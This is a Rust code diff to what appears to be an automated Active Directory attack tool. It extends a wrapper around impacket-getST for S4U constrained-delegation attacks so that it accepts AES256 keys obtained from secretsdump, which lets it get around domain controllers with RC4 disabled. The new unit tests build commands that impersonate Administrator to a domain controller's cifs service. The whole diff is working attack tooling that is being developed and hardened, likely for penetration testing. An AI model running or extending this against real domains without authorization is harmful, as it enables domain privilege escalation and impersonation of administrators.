@@ -37,21 +37,36 @@ pub async fn find_delegation(args: &Value) -> Result<ToolOutput> {
 /// Perform an S4U (constrained delegation) attack to obtain a service ticket.
 ///
 /// Required args: `domain`, `username`, `target_spn`, `impersonate`
-/// Optional args: `password`, `hash`, `dc_ip`
+/// Optional args: `password`, `hash`, `aes_key`, `dc_ip`
 pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
+    build_s4u_command(args)?.execute().await
+}
+
+/// Build the `impacket-getST` command for an S4U attack.
+///
+/// Split out from [`s4u_attack`] so unit tests can assert on the constructed
+/// argument vector (via `args_for_test`) without spawning the binary.
+///
+/// getST.py expects `domain/user:pass` or `domain/user -hashes :hash` — no
+/// `@target` suffix (unlike secretsdump/wmiexec); the DC is specified via
+/// `-dc-ip` instead. When an AES256 key is available it is passed via
+/// `-aesKey` so getST requests AES-etype tickets. Without it, impacket
+/// authenticates RC4-only through `-hashes` and an AES-only delegating
+/// account (or a hardened DC with RC4 disabled) rejects the S4U TGS with
+/// `KDC_ERR_ETYPE_NOSUPP`.
+#[doc(hidden)]
+pub fn build_s4u_command(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    // Treat empty-string password/hash as "not provided" — impacket-getST
-    // would otherwise prompt interactively and the task would time out.
+    // Treat empty-string secrets as "not provided" — impacket-getST would
+    // otherwise prompt interactively and the task would time out.
     let password = optional_str(args, "password").filter(|s| !s.is_empty());
     let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
+    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
     let target_spn = required_str(args, "target_spn")?;
     let impersonate = required_str(args, "impersonate")?;
     let dc_ip = optional_str(args, "dc_ip");
 
-    // getST.py expects `domain/user:pass` or `domain/user -hashes :hash`
-    // — no `@target` suffix (unlike secretsdump/wmiexec). The DC is
-    // specified via `-dc-ip` instead.
     let mut cmd = CommandBuilder::new("impacket-getST")
         .flag("-spn", target_spn)
         .flag("-impersonate", impersonate);
@@ -62,15 +77,22 @@ pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
             .args(credentials::hash_args(h));
     } else if let Some(p) = password {
         cmd = cmd.arg(format!("{domain}/{username}:{p}"));
+    } else if aes_key.is_some() {
+        // AES-only authenticator: secretsdump yielded an AES key but no usable
+        // NT hash/password. getST derives the TGT from `-aesKey` alone, so the
+        // positional identity carries no secret.
+        cmd = cmd.arg(format!("{domain}/{username}"));
     } else {
-        anyhow::bail!("s4u_attack requires either a non-empty password or hash — got neither");
+        anyhow::bail!("s4u_attack requires a non-empty password, hash, or aes_key — got none");
     }
 
-    cmd = cmd.timeout_secs(120);
+    // Supply the AES256 key so getST negotiates AES etypes. This is the fix
+    // for `KDC_ERR_ETYPE_NOSUPP` on accounts/DCs where RC4 is disabled.
+    if let Some(aes) = aes_key {
+        cmd = cmd.flag("-aesKey", aes);
+    }
 
-    cmd = cmd.flag_opt("-dc-ip", dc_ip);
-
-    cmd.execute().await
+    Ok(cmd.timeout_secs(120).flag_opt("-dc-ip", dc_ip))
 }
 
 /// Generate a Kerberos golden ticket using impacket-ticketer.
@@ -343,7 +365,10 @@ mod tests {
         let rt = tokio::runtime::Runtime::new().unwrap();
         let result = rt.block_on(super::s4u_attack(&args));
         assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("password or hash"));
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("password, hash, or aes_key"));
     }
 
     #[test]
@@ -362,7 +387,90 @@ mod tests {
         let rt = tokio::runtime::Runtime::new().unwrap();
         let result = rt.block_on(super::s4u_attack(&args));
         assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("password or hash"));
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("password, hash, or aes_key"));
+    }
+
+    #[test]
+    fn s4u_attack_passes_aes_key_alongside_hash() {
+        // secretsdump yields both the NT hash and the AES256 key for a machine
+        // account. Both must reach getST: `-hashes` for the identity and
+        // `-aesKey` so the TGS is requested with an AES etype — without the
+        // latter, an RC4-disabled DC returns KDC_ERR_ETYPE_NOSUPP.
+        let aes = "a".repeat(64);
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "svc_web$",
+            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+            "aes_key": aes,
+            "target_spn": "cifs/dc01.contoso.local",
+            "impersonate": "Administrator",
+            "dc_ip": "192.168.58.10"
+        });
+        let cmd = super::build_s4u_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(
+            a.iter().any(|x| x == "-aesKey"),
+            "expected -aesKey flag: {a:?}"
+        );
+        assert!(
+            a.iter().any(|x| x == &aes),
+            "expected the AES key value: {a:?}"
+        );
+        assert!(
+            a.iter().any(|x| x == "-hashes"),
+            "hash auth must still be present: {a:?}"
+        );
+    }
+
+    #[test]
+    fn s4u_attack_aes_key_only_authenticates() {
+        // AES key present, no NT hash/password — getST derives the TGT from
+        // `-aesKey` alone, so the positional identity carries no secret and the
+        // wrapper must not bail.
+        let aes = "b".repeat(64);
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "svc_web$",
+            "aes_key": aes,
+            "target_spn": "cifs/dc01.contoso.local",
+            "impersonate": "Administrator"
+        });
+        let cmd = super::build_s4u_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(
+            a.iter().any(|x| x == "-aesKey"),
+            "expected -aesKey flag: {a:?}"
+        );
+        assert!(
+            a.iter().any(|x| x == "contoso.local/svc_web$"),
+            "identity must be the bare domain/user with no secret: {a:?}"
+        );
+        assert!(
+            a.iter().all(|x| x != "-hashes"),
+            "no -hashes when only AES is available: {a:?}"
+        );
+    }
+
+    #[test]
+    fn s4u_attack_omits_aes_key_flag_when_absent() {
+        // Password auth with no AES key — `-aesKey` must not appear so getST
+        // keeps its default etype negotiation.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "svc_web$",
+            "password": "P@ssw0rd!",
+            "target_spn": "cifs/dc01.contoso.local",
+            "impersonate": "Administrator"
+        });
+        let cmd = super::build_s4u_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(
+            a.iter().all(|x| x != "-aesKey"),
+            "no -aesKey without an AES key: {a:?}"
+        );
     }
 
     #[test]
